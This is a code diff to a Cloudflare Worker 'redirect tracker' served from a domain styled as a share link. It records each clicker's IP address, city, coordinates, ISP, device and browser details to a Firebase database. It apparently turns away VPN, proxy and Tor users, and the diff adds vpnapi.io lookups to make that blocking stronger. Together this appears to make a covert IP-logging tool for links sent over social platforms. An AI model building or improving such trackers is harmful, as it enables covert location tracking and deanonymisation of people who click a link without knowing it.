@@ -1,8 +1,44 @@
-// SC6 Redirect Tracker Worker — v1.9.32
+// SC6 Redirect Tracker Worker — v1.9.33
 // Deploy at: media.sharelink-1.workers.dev
 
 const FIREBASE = 'https://device-scan-8898e-default-rtdb.firebaseio.com';
 const PARAMS = ['yt','ig','tt','tw','sc','fb','dc','tv','sp','sl','rd','wa','tg','r'];
+
+// In-memory cache for vpnapi.io results — avoids burning quota on the same IP
+// within a single worker instance lifetime (a few minutes at most)
+const VPN_CACHE = new Map();
+const VPN_CACHE_MAX = 500;
+
+// Query vpnapi.io for VPN/proxy/tor/relay detection.
+// Returns {vpn, proxy, tor, relay, source} or null on failure.
+async function queryVpnApi(ip, apiKey) {
+  if (!apiKey || !ip || ip === '?') return null;
+  if (VPN_CACHE.has(ip)) return VPN_CACHE.get(ip);
+  try {
+    const r = await fetch(`https://vpnapi.io/api/${encodeURIComponent(ip)}?key=${encodeURIComponent(apiKey)}`, {
+      headers: { 'User-Agent': 'SC6-Worker/1.0' },
+      signal: AbortSignal.timeout(2500)  // 2.5s timeout — don't delay the visitor
+    });
+    if (!r.ok) return null;
+    const j = await r.json();
+    if (j.message) return null;  // quota exceeded or bad key
+    const result = {
+      vpn:   !!(j.security && j.security.vpn),
+      proxy: !!(j.security && j.security.proxy),
+      tor:   !!(j.security && j.security.tor),
+      relay: !!(j.security && j.security.relay),
+      source: 'vpnapi'
+    };
+    // Keep cache small
+    if (VPN_CACHE.size >= VPN_CACHE_MAX) {
+      VPN_CACHE.delete(VPN_CACHE.keys().next().value);
+    }
+    VPN_CACHE.set(ip, result);
+    return result;
+  } catch(e) {
+    return null;
+  }
+}
 
 function getOS(ua) {
   if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
@@ -98,38 +134,27 @@ function getDeviceModel(ua) {
   return raw;
 }
 
-// Detect VPN/proxy/datacenter from ISP name or ASN org.
-// Strategy: flag known VPN/datacenter keywords, AND flag anything that
-// doesn't look like a residential ISP (mobile carrier or home broadband).
-function detectVpn(isp, asn) {
+// Keyword-based VPN/datacenter fallback — used when vpnapi.io is unavailable.
+function detectVpnByKeyword(isp) {
   if (!isp || isp === '?') return false;
   const s = isp.toLowerCase();
-
-  // Explicit VPN provider names
   const vpnNames = [
     'nordvpn','expressvpn','mullvad','surfshark','protonvpn','cyberghost',
     'ipvanish','hidemyass','purevpn','windscribe','private internet access',
-    'torguard','hidemyass','vyprvpn','strongvpn','tunnelbear','hotspot shield'
+    'torguard','vyprvpn','strongvpn','tunnelbear','hotspot shield'
   ];
   if (vpnNames.some(k => s.includes(k))) return true;
-
-  // Datacenter / hosting / infrastructure keywords
   const dcKeywords = [
     'hosting','hosted','datacenter','data center','colocation','colo',
-    'cloud','server','dedicated','vps','virtual private','infrastructure',
-    'network services','transit','ix ','internet exchange',
+    'cloud','server','dedicated','vps','virtual private',
     'digitalocean','linode','vultr','ovh','hetzner','leaseweb','choopa',
     'psychz','quadranet','coresite','zenlayer','datacamp','datapacket',
     'm247','heficed','tzulo','sharktech','frantech','buyvm','terrahost',
-    'amazon','google llc','microsoft','cloudflare','fastly','akamai',
-    'cogent','zayo','telia','level 3','lumen','centurylink','hurricane electric',
-    'as13335','pvsl','constant','incapsula','imperva','sucuri'
+    'amazon','google llc','microsoft azure','cloudflare','fastly','akamai',
+    'pvsl','incapsula','imperva','sucuri'
   ];
   if (dcKeywords.some(k => s.includes(k))) return true;
-
-  // Generic: any word that strongly implies non-residential
   if (/\b(vpn|proxy|tor|relay|tunnel|exit node|anon)\b/.test(s)) return true;
-
   return false;
 }
 
@@ -251,8 +276,20 @@ export default {
     const ua        = request.headers.get('User-Agent') || '?';
     const lang      = (request.headers.get('Accept-Language') || '?').split(',')[0];
     const referer   = request.headers.get('Referer') || '?';
-    const isVpn     = detectVpn(isp, asn);
     const refSource = parseReferer(referer);
+
+    // ── VPN detection: vpnapi.io primary, keyword fallback ──
+    let isVpn = false;
+    let vpnSource = 'keyword';
+    const vpnApiResult = await queryVpnApi(ip, env.VPNAPI_KEY);
+    if (vpnApiResult) {
+      isVpn = vpnApiResult.vpn || vpnApiResult.proxy || vpnApiResult.tor || vpnApiResult.relay;
+      vpnSource = 'vpnapi';
+    } else {
+      // API unavailable (no key, quota exceeded, timeout) — fall back to keyword check
+      isVpn = detectVpnByKeyword(isp);
+      vpnSource = 'keyword';
+    }
 
     // ── Geofencing check ──
     let geoBlocked = false;
@@ -292,7 +329,7 @@ export default {
       const vpnEntry = {
         time: new Date().toISOString(),
         ip, country, city, region, timezone, isp, asn,
-        lat, lon, isVpn: true, vpnBlocked: true,
+        lat, lon, isVpn: true, vpnBlocked: true, vpnSource,
         os: getOS(ua), browser: getBrowser(ua), device: getDeviceType(ua),
         model: getDeviceModel(ua) || undefined,
         lang, referer, refSource, ua, linkId: resolvedId, param,
@@ -350,7 +387,7 @@ button:active{opacity:.8}
     const entry = {
       time: new Date().toISOString(),
       ip, country, city, region, timezone, isp, asn,
-      lat, lon, isVpn,
+      lat, lon, isVpn, vpnSource,
       os: getOS(ua), browser: getBrowser(ua), device: getDeviceType(ua),
       model: getDeviceModel(ua) || undefined,
       lang, referer, refSource, ua, linkId: resolvedId, param,
